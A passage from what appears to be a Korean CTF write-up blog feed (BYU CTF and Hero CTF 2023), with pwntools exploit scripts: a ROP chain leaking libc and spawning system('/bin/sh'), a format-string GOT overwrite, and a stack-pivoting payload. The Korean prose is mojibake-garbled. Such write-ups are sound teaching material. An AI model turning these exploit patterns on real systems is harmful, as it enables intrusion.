class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, filename)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, contents)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> printf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - 2038</title>
      <link href="/230523-byuctf2023-2038/"/>
      <url>/230523-byuctf2023-2038/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I know you really want the flag, so Iâ€™ll print it out for you, but only after January 1st, 2024 :)<br>nc byuctf.xyz 40007<br>tag: easy</p></blockquote><ul><li>[215 solves &#x2F; 100 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, nptr);</span><br><span class="line">v6 = atoi(nptr);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v6 &gt; <span class="number">1704067199</span> )</span><br><span class="line">&#123;</span><br><span class="line">  timer = v6;</span><br><span class="line">  v4 = ctime(&amp;timer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSpecified datetime - %s\n&quot;</span>, v4);</span><br><span class="line">  v8 = time(<span class="number">0LL</span>);</span><br><span class="line">  v5 = ctime(&amp;v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Current datetime - %s\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">if</span> ( timer &gt;= v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;print_flag&#x27; was not run because specified date has not occurred yet. Exiting...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Time requirement has been met. Running &#x27;print_flag&#x27;...&quot;</span>);</span><br><span class="line">    print_flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì‚¬ì‹¤ ìžì„¸ížˆ ì•ˆë³´ê³  ë°”ë¡œ í’€ì—ˆë‹¤. ìž…ë ¥ê°’ì´ 1704067199ë³´ë‹¤ í¬ë©´ ifë¬¸ì— ë“¤ì–´ê°€ê¸¸ëž˜ ë¨¼ì € ì´ê±¸ ëª©í‘œë¡œ ì €ê±°ë³´ë‹¤ í° ìˆ˜ë¥¼ ì£¼ì—ˆë‹¤. ê·¸ëž¬ë”ë‹ˆ ìš´ ì¢‹ê²Œë„ <code>print_flag</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ì—ˆë‹¤. ã…Ž</p><p>ì°¸ê³ ë¡œ timeí•¨ìˆ˜ì— ë„ê°’ì„ ë„£ê²Œ ë˜ë©´ 1970ë…„ 1ì›” 1ì¼ 0ì‹œ ì´í›„ë¶€í„° í˜„ì œê¹Œì§€ì˜ ì‹œê°„ì´ ì´ˆë¡œ ë³€í™˜ëœ ê°’ì´ ë°˜í™˜ëœë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./2038&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./2038&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">21704067199</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - frorg</title>
      <link href="/230523-byuctf2023-frorg/"/>
      <url>/230523-byuctf2023-frorg/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I love arnimals like frorggies and crarbs and octurpurse<br>nc byuctf.xyz 40015<br>tag: hard </p></blockquote><ul><li>[45 solves &#x2F; 463 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>ì´ ë¬¸ì œëŠ” ì†ŒìŠ¤ ì½”ë“œê°€ ì£¼ì–´ì ¸ ìžˆì§€ ì•Šì•„ì„œ IDAë¡œ ë°”ì´ë„ˆë¦¬ ë¶„ì„í•´ì•¼ í•œë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I love frorggies so much! So much I made this application to store all the frorgie names you want&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many frorgies you want to store? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4[<span class="number">0</span>]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter frorgy name: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v4[<span class="number">1</span>] + <span class="number">10</span> * i, <span class="number">0xA</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>main ìžì²´ëŠ” ê°„ë‹¨í•˜ë‹¤. ëª…ë°±í•˜ê²Œ bofê°€ ë°œìƒí•˜ëŠ”ë° ì´ bofë¥¼ ëª‡ ë²ˆ ì¼ìœ¼í‚¬ì§€ ë‚´ê°€ ì§€ì •í•  ìˆ˜ ìžˆë‹¤. ë¬¸ì œëŠ” 10ê¸€ìžì”© ìž…ë ¥í•  ìˆ˜ ìžˆì–´ì„œ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ìž…ë ¥í•  ë•Œ íŒ¨ë”©ì„ ìž˜ ì£¼ë©´ì„œ í•´ì•¼ í•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">___(*6)___ _x_    | __(&amp;4)__ __(*4)__</span><br><span class="line">_(^2)_ ___(&amp;6)___ | ____(^8)____</span><br><span class="line">____(%8)____      | ___x___ _(%2)_</span><br></pre></td></tr></table></figure><p>*, &amp;, ^, % ìˆœì„œë¡œ ê°’ì„ ì¤€ë‹¤ê³  ìƒê°í•˜ë©´ ëœë‹¤.</p><p>ë‘ ë²ˆì§¸ ë©”ì¸ì—ì„œëŠ” <code>/bin/sh</code> ë¬¸ìžì—´ ìœ„ì¹˜ë¥¼ &amp;ë²ˆì§¸ì— ë„£ê³  ì‹¶ì—ˆëŠ”ë° libc ì£¼ì†ŒëŠ” 6ë°”ì´íŠ¸ë¡œ ëë‚˜ì§€ ì•Šì•„ì„œ ^ë²ˆì§¸ì— ë„£ì–´ì•¼ í–ˆë‹¤. ê·¸ëž˜ì„œ <code>pop rdi</code> ì „ì— <code>ret</code>ì„ ë„£ì–´ì¤˜ì„œ <code>/bin/sh</code> ë¬¸ìžì—´ ìœ„ì¹˜ë¥¼ ^ë²ˆì§¸ì— ì£¼ëŠ” ê²ƒì— ì„±ê³µí–ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./frorgp&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./frorgp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011e5</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">paylaod</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, paylaod)</span><br><span class="line">    info(<span class="string">&quot;send&quot;</span>)</span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">name(p32(pop_rdi).rjust(<span class="number">0xa</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">name(p32(<span class="number">0x0</span>) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>]).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 00 00 40 ?? ??</span></span><br><span class="line">name(<span class="string">b&#x27;\x00\x00&#x27;</span> + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">name(p64(e.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc.address = libc_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccond main</span></span><br><span class="line"><span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">name(p32(ret).rjust(<span class="number">0xa</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># ret</span></span><br><span class="line">name(p32(<span class="number">0x0</span>) + p32(pop_rdi).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 00 00 40 ?? ??</span></span><br><span class="line">name(<span class="string">b&#x27;\x00\x00&#x27;</span> + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))))</span><br><span class="line">name(p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(pop_rdi).ljust(6, b&#x27;\x00&#x27;)</span><br><span class="line">00 00 40 ?? ??</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 review</title>
      <link href="/230518-heroctf2023-0review/"/>
      <url>/230518-heroctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><img src="/images/230518-heroctf2023-0review/Screenshot 2023-05-18 at 15.17.19.png" width=450/><br><p>ìž¬ë°ŒëŠ” ë¬¸ì œê°€ ë§Žì•˜ë‹¤. ë‚œì´ë„ëŠ” ìƒê°ë³´ë‹¤ ì–´ë ¤ì› ë˜ ê²ƒ ê°™ë‹¤. easy 2 ë¬¸ì œ, medium 1, hard 2 ë¬¸ì œ ì˜€ëŠ”ë°,.. Unknown ë¬¸ì œëŠ” í’€ë‹¤ê°€ ê²°êµ­ ëª»í’€ì—ˆë‹¤. syscall ë¬¸ì œì¸ë°, ê°€ì ¯ë“¤ì´ ë„ˆë¬´ ê¹Œë‹¤ë¡œìš¸ ë¿ë§Œì´ ì•„ë‹ˆë¼ rax ë ˆì§€ìŠ¤í„°ë¥¼ ì¡°ì ˆí•˜ê¸°ê°€ ë§¤ìš° ì–´ë ¤ì› ë‹¤. ê±°ê¸°ë‹¤ê°€ ê°€ì ¯ì€ ìµìˆ™í•˜ì§€ë„ ì•Šì€ xmm ë ˆì§€ìŠ¤í„°ë¡œ ì²˜ìŒ ë³´ëŠ” ëª…ë ¹ì–´ë¥¼ ì´ìš©í•˜ì—¬ ë†€ê³  ìžˆì–´ì„œ ë¡¸ì—…ì„ ë´ë„ ì´í•´ê°€ ìž˜ ì•ˆëë‹¤. ã…Žã…Ž; ë§ˆì§€ë§‰ ë¬¸ì œëŠ” tcacheë¥¼ ì´ìš©í•œ heap ë¬¸ì œë¼ì„œ ë³´ì§€ ì•Šì•˜ë‹¤.</p><p>ë‚´ê°€ í‘¼ ë¬¸ì œë“¤ ì¤‘ì—ì„œ easy ë‘ ë¬¸ì œëŠ” ê´œì°®ì•˜ê³ , medium ë¬¸ì œëŠ” ìƒê°ë³´ë‹¤ ì–´ë ¤ì› ë‹¤. ìš”ì¦˜ syscallì„ ì´ìš©í•˜ëŠ” ë¬¸ì œê°€ ìžì£¼ ë³´ì´ëŠ”ë°, ëª¨ë“  ê°€ì ¯ì„ ê¼¼ê¼¼í•˜ê²Œ ë³´ëŠ” ë²„ë¦‡ì„ ë“¤ì—¬ì•¼ê² ë‹¤ëŠ” ìƒê°ì„ í•˜ì˜€ë‹¤. ê·¸ë¦¬ê³  <code>execve</code>ë¥¼ ì‹¤í–‰ì‹œí‚¤ê³  ì‹¶ì„ ë•Œ, ì¸ìžëŠ” ì–´ë””ì— ì €ìž¥í•´ì•¼í•˜ëŠ” ì§€ë„ ëˆˆì¹˜ìžˆê²Œ ìƒê°í•´ì•¼ê² ë‹¤.</p><ul><li><a href="https://jiravvit.github.io/230518-heroctf2023-appointment-book/">https://jiravvit.github.io/230518-heroctf2023-appointment-book/</a></li><li><a href="https://jiravvit.github.io/230518-heroctf2023-impossible-v2/">https://jiravvit.github.io/230518-heroctf2023-impossible-v2/</a></li><li><a href="https://jiravvit.github.io/230518-heroctf2023-rope-dancer/">https://jiravvit.github.io/230518-heroctf2023-rope-dancer/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Impossible v2 (fsb)</title>
      <link href="/230518-heroctf2023-impossible-v2/"/>
      <url>/230518-heroctf2023-impossible-v2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>Your colleague trolls you again by giving you an impossible challenge, betting $200 that, this time, you wonâ€™t succeed. Show him that this impossible challenge is in fact easy!<br>Host : nc static-03.heroctf.fr 5001<br>Format : Hero{flag}<br>Author : SoEasY<br>easy</p></blockquote><ul><li>[41 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì•„ëž˜ì²˜ëŸ¼ <code>fsb</code>ê°€ ë°œìƒí•œë‹¤. (<code>buf</code>ê°€ ìš°ë¦¬ì˜ ìž…ë ¥ê°’ì´ë‹¤.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(message, buf);</span><br></pre></td></tr></table></figure><p><code>message</code>ë¥¼ ì¶œë ¥í•´ì£¼ëŠ” ê¸°ëŠ¥ì´ ì—†ê¸° ë•Œë¬¸ì— ë­”ê°€ leakí• ìˆ˜ê°€ ì—†ë‹¤. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">b&#x27;_%p&#x27;</span> * <span class="number">8</span></span><br></pre></td></tr></table></figure><p>ìœ„ paylaodë¡œ ìž…ë ¥ì„ ë³´ë‚´ê³  ë””ë²„ê±° ìƒìœ¼ë¡œ <code>message</code>ë¥¼ í™•ì¸í•˜ë©´ ì•„ëž˜ì™€ ê°™ì´ offsetì´ 7ìž„ì„ í™•ì¸í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/s 0x000000004040e0</span><br><span class="line">0x4040e0 &lt;message&gt;:     &quot;aaaaaaaa_0x21_0x7f30b4e66931_0x14278b1_(nil)_(nil)_0x14276b0_0x6161616161616161_0x255f70255f70255f\n&quot;</span><br></pre></td></tr></table></figure><p><code>fsb</code>ê°€ ë°œìƒí•œ í›„, <code>if (!memcmp(message, expected, 0x10uLL))</code>ê°€ ì°¸ì´ë©´ <code>flag.txt</code>ë¥¼ ì¶œë ¥í•´ì¤€ë‹¤.</p><p><code>pie</code>ë„ ì•ˆê±¸ë ¤ìžˆìœ¼ë‹ˆ <code>memcmp@got</code>ì— <code>flag.txt</code>ê°€ ì¶œë ¥ë˜ëŠ” ì£¼ì†Œë¥¼ ë®ì–´ì¤¬ë‹¤. ê¸¸ì´ê°€ ì¶©ë¶„í•˜ì§€ ì•Šìœ¼ë‹ˆ 2ë°”ì´íŠ¸ë§Œ ë®ì–´ì£¼ì—ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./impossible_v2&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./impossible_v2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 7</span></span><br><span class="line"><span class="comment"># payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload += b&#x27;a&#x27; * 8</span></span><br><span class="line"><span class="comment"># payload += b&#x27;_%p&#x27; * 8</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;e.got[<span class="string">&#x27;memcmp&#x27;</span>] : p16(<span class="number">0x14B7</span>)&#125;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;e:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># der $_got()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - stack pivoting</title>
      <link href="/230518-pwn-stack-pitvoting/"/>
      <url>/230518-pwn-stack-pitvoting/</url>
      
        <content type="html"><![CDATA[<ol><li>rbpë¥¼ jumpí•˜ê³  ì‹¶ì€ ì£¼ì†Œ -8ë¡œ ì„¸íŒ… (rop ê°€ì ¯ì´ ìžˆëŠ” ê³³ - 8)</li><li>retë¥¼ leave_retì£¼ì†Œë¡œ ë³€ê²½</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * dummy</span><br><span class="line">payload += p64(rop_payload - <span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Rope Dancer (srop, stack pivoting)</title>
      <link href="/230518-heroctf2023-rope-dancer/"/>
      <url>/230518-heroctf2023-rope-dancer/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>A circus has just opened near you and you would love to work there as a rope dancer. Perhaps you could access their recruitment criteria to maximize your chances of being selected?<br>Host : nc static-03.heroctf.fr 5002<br>Format : Hero{flag}<br>Author : SoEasY<br>medium</p></blockquote><ul><li>[31 solves &#x2F; 460 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">sys_read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">sys_read(<span class="number">0</span>, motivation_letter, <span class="number">0x1F4</span>uLL);</span><br></pre></td></tr></table></figure><p>ì²˜ìŒì— <code>buf</code>ì— ìž…ë ¥ì„ ë°›ê³  ì „ì—­ ë³€ìˆ˜ì¸ <code>motivation_letter</code> ì—ë„ ë§¤ìš° ë„‰ë„‰í•˜ê²Œ ìž…ë ¥ì„ ë°›ëŠ”ë‹¤. ë³´í˜¸ê¸°ë²•ì´ ì•„ë¬´ê²ƒë„ ê±¸ë ¤ìžˆì§€ ì•Šê¸° ë•Œë¬¸ì— ë‹¨ìˆœí•˜ê²Œ ìƒê°í•´ì•¼í•œë‹¤.</p><p><code>pie</code>ê°€ ê±¸ë ¤ìžˆì§€ ì•Šì•„ì„œ ì „ì—­ ë³€ìˆ˜ ì£¼ì†Œë¥¼ ë°”ë¡œ ì•Œ ìˆ˜ ìžˆê³ , ê°’ì„ ì ì€ ê³³ì˜ ì£¼ì†Œë¥¼ ê³„ì‚°í•  ìˆ˜ ìžˆë‹¤. (ì˜¤í”„ì…‹ì„ ê³„ì‚°í•  ìˆ˜ ìžˆë‹¤.)</p><p>ì²˜ìŒì— <code>buf</code>ì— ìž…ë ¥ì„ ë°›ì„ ë•Œ ëª…ë°±í•œ <code>bof</code>ê°€ ë°œìƒí•œë‹¤. 